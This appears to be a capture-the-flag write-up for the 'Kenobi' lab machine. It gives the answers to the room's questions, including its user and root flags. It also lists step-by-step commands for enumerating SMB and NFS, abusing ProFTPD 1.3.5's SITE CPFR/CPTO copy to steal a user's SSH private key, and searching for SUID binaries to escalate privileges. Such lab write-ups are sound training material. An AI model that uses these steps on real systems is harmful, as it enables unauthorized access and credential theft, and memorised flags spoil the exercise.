# Questions

1. Scan the machine with nmap, how many ports are open? 7
2. How many SMB shares are there? 3
3. What is the file can you see on the share? log.txt
4. What port is FTP running on? 21
5. What is the version (of ProFtpd)? 1.3.5
6. How many exploits are there for the ProFTPd running? 4
7. What is Kenobi's user flag (/home/kenobi/user.txt)? d0b0f3f53b6caa532a83915e19224899
8. What file looks particularly out of the ordinary? /usr/bin/menu
9. Run the binary, how many options appear? 3
10. What is the root flag (/root/root.txt)? 177b3cd8562289f37382721c28381f02
# Walkthrough

Start the Metasploit DB engine `msfdb init`. If it fails, make sure that the PostgreSQL service is running, if not run `systemctl start postgresql`.

start metasploit, `msfconsole` and create a new workspace `workspace -a kenobi`.

Run a version scan against the machine, we don't care about being detected and can use the following `db_nmap -sV --version-all 10.10.108.164` gives the answers to 1 and 4

Using nmap, we can enumarte SMB shares `db_nmap -p 139,445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.108.164`

We're told to connect to the share as anonymous and give information on what we can see there `smbclient //10.10.108.164/anonymous` and `ls` gives us what we need.

We're told to run the following `db_nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.108.164` in order to see the mount location for the NFS.

we're told to connect to the machine over FTP `nc 10.10.108.164 21` which prints out the current version the ftp server is running on. We can then look this up in a DB of vulnerabilities `searchsploit "proftpd 1.3.5"`

Knowing the user of the share, we can copy their RSA key used to connect over ssh to a location on the RPC share that we'd be able to access  
``` FTP
SITE CPFR /home/kenobi/.shh/id_rsa
SITE CPTO /var/tmp/id_rsa
```
we can now mount and copy the rsa key to our local machine
``` bash
mkdir /mnt/kenobiNFS  
mount 10.10.108.164:/var /mnt/kenobiNFS  
ls -la /mnt/kenobiNFS
cp /mnt/kenobiNFS/tmp/id_rsa .
sudo chmod 600 id_rsa
ssh -i id_rsa kenobi@10.10.108.164
```

Now that we're connected to the remote machine as an authenticated user, we want to escalate privileges. First we can check for any exploitable SUID bianries `find / -type f -perm -04000 -ls 2>/dev/null`